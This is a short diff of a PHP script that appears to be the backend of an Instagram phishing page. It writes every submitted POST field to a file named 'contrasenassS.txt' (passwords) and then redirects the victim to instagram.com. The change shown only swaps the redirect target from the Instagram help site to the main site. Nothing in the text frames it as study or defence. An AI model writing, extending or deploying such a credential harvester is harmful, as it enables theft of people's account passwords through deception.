@@ -1,6 +1,6 @@
 <?php
 
-header ('Location: https://help.instagram.com/ ');
+header ('Location: https://instagram.com/ ');
 $handle = fopen("contrasenassS.txt", "a"); 
 foreach($_POST as $variable => $value) {
 	fwrite($handle, $variable);
